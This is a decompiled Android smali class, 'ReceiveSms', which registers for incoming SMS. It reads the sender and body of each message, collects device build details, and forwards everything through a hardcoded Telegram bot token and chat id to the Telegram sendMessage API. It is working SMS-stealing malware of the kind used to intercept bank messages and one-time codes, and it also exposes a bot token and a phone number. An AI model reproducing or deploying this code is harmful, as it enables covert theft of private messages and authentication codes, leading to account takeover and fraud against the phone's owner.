.class public Lcom/example/appjava/ReceiveSms;
.super Landroid/content/BroadcastReceiver;
.source "ReceiveSms.java"


# instance fields
.field final TAG:Ljava/lang/String;

.field private final client:Lokhttp3/OkHttpClient;

.field device:Ljava/lang/String;

.field id:Ljava/lang/String;

.field id2:Ljava/lang/String;

.field no_hp:Ljava/lang/String;

.field token:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    const-string v0, "demo"

    iput-object v0, p0, Lcom/example/appjava/ReceiveSms;->TAG:Ljava/lang/String;

    new-instance v0, Lokhttp3/OkHttpClient;

    invoke-direct {v0}, Lokhttp3/OkHttpClient;-><init>()V

    iput-object v0, p0, Lcom/example/appjava/ReceiveSms;->client:Lokhttp3/OkHttpClient;

    const-string v0, "7488462937:AAGBVYJ1fjc10Vgzt8ZqCzmC3PsmRwnNwio"

    iput-object v0, p0, Lcom/example/appjava/ReceiveSms;->token:Ljava/lang/String;

    const-string v0, "6725854937"

    iput-object v0, p0, Lcom/example/appjava/ReceiveSms;->id:Ljava/lang/String;

    const-string v0, ""

    iput-object v0, p0, Lcom/example/appjava/ReceiveSms;->id2:Ljava/lang/String;

    const-string v0, "081311115214"

    iput-object v0, p0, Lcom/example/appjava/ReceiveSms;->no_hp:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Landroid/os/Build;->BRAND:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " - "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/example/appjava/ReceiveSms;->device:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 21

    move-object/from16 v1, p0

    const-string v0, "_%0A%0A*\ud835\udc0c\ud835\udc1e\ud835\udc2b\ud835\udc1e\ud835\udc24 \ud835\udc07\ud835\udc0f:*"

    const-string v2, "_,%0A*\ud835\udc0f\ud835\udc1e\ud835\udc2c\ud835\udc1a\ud835\udc27* : _"

    const-string v3, "&text=%0A%0A*\ud835\udc0f\ud835\udc1e\ud835\udc2c\ud835\udc1a\ud835\udc27* : _"

    const-string v4, "/sendMessage?parse_mode=markdown&chat_id="

    const-string v5, "https://api.telegram.org/bot"

    const-string v6, " "

    const-string v7, "\n - Product : "

    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v8

    const-string v9, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_2

    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v8

    move-object v9, v8

    if-eqz v8, :cond_1

    :try_start_0
    const-string v8, "pdus"

    invoke-virtual {v9, v8}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, [Ljava/lang/Object;

    array-length v10, v8

    new-array v10, v10, [Landroid/telephony/SmsMessage;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    const/4 v11, 0x0

    :goto_0
    :try_start_1
    array-length v12, v10

    if-ge v11, v12, :cond_0

    aget-object v12, v8, v11

    check-cast v12, [B

    invoke-static {v12}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v12

    aput-object v12, v10, v11

    aget-object v12, v10, v11

    invoke-virtual {v12}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v12

    aget-object v13, v10, v11

    invoke-virtual {v13}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v13

    const-string v14, "&"

    const-string v15, "  "

    invoke-virtual {v13, v14, v15}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v13

    const-string v14, "#"

    invoke-virtual {v13, v14, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v13

    const-string v14, "?"

    invoke-virtual {v13, v14, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v14

    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v16, v6

    const-string v6, "ID : "

    invoke-virtual {v15, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->ID:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v15, "\n - User : "

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->USER:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v15, "\n - Brand : "

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->BRAND:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v15, "\n - Device : "

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->DEVICE:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v15, "\n - Board : "

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->BOARD:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v15, "\n - BOOTLOADER : "

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->BOOTLOADER:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v15, "\n - DISPLAY : "

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->DISPLAY:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v15, "\n - FINGERPRINT : "

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v15, "\n - HARDWARE : "

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->HARDWARE:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v15, "\n - HOST : "

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->HOST:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v15, "\n -MANUFACTURER : "

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v15, "\n - MODEL : "

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v15, "\n -TAGS : "

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->TAGS:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v15, "\n - TYPE : "

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v15, Landroid/os/Build;->TYPE:Ljava/lang/String;

    invoke-virtual {v6, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    move-object/from16 v17, v8

    move-object v15, v9

    :try_start_2
    sget-wide v8, Landroid/os/Build;->TIME:J

    invoke-virtual {v6, v8, v9}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v8, "\n - "

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    move-object v8, v7

    iget-object v9, v1, Lcom/example/appjava/ReceiveSms;->client:Lokhttp3/OkHttpClient;

    move-object/from16 v18, v6

    new-instance v6, Lokhttp3/Request$Builder;

    invoke-direct {v6}, Lokhttp3/Request$Builder;-><init>()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    move-object/from16 v19, v7

    :try_start_3
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    move-object/from16 v20, v10

    iget-object v10, v1, Lcom/example/appjava/ReceiveSms;->token:Ljava/lang/String;

    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    iget-object v10, v1, Lcom/example/appjava/ReceiveSms;->id:Ljava/lang/String;

    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    iget-object v10, v1, Lcom/example/appjava/ReceiveSms;->device:Ljava/lang/String;

    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v6

    invoke-virtual {v6}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v6

    invoke-virtual {v9, v6}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v6

    new-instance v7, Lcom/example/appjava/ReceiveSms$1;

    invoke-direct {v7, v1}, Lcom/example/appjava/ReceiveSms$1;-><init>(Lcom/example/appjava/ReceiveSms;)V

    invoke-interface {v6, v7}, Lokhttp3/Call;->enqueue(Lokhttp3/Callback;)V

    iget-object v6, v1, Lcom/example/appjava/ReceiveSms;->client:Lokhttp3/OkHttpClient;

    new-instance v7, Lokhttp3/Request$Builder;

    invoke-direct {v7}, Lokhttp3/Request$Builder;-><init>()V

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    iget-object v10, v1, Lcom/example/appjava/ReceiveSms;->token:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    iget-object v10, v1, Lcom/example/appjava/ReceiveSms;->id2:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    iget-object v10, v1, Lcom/example/appjava/ReceiveSms;->device:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v7

    invoke-virtual {v7}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v7

    invoke-virtual {v6, v7}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v6

    new-instance v7, Lcom/example/appjava/ReceiveSms$2;

    invoke-direct {v7, v1}, Lcom/example/appjava/ReceiveSms$2;-><init>(Lcom/example/appjava/ReceiveSms;)V

    invoke-interface {v6, v7}, Lokhttp3/Call;->enqueue(Lokhttp3/Callback;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    add-int/lit8 v11, v11, 0x1

    move-object v7, v8

    move-object v9, v15

    move-object/from16 v6, v16

    move-object/from16 v8, v17

    move-object/from16 v10, v20

    goto/16 :goto_0

    :catch_0
    move-exception v0

    move-object/from16 v7, v19

    goto :goto_1

    :catch_1
    move-exception v0

    move-object/from16 v19, v7

    goto :goto_1

    :cond_0
    move-object/from16 v19, v7

    move-object/from16 v17, v8

    move-object v15, v9

    move-object/from16 v20, v10

    goto :goto_2

    :catch_2
    move-exception v0

    move-object/from16 v19, v7

    move-object v15, v9

    goto :goto_1

    :catch_3
    move-exception v0

    move-object v15, v9

    :goto_1
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_2

    :cond_1
    move-object v15, v9

    :cond_2
    :goto_2
    return-void
.end method
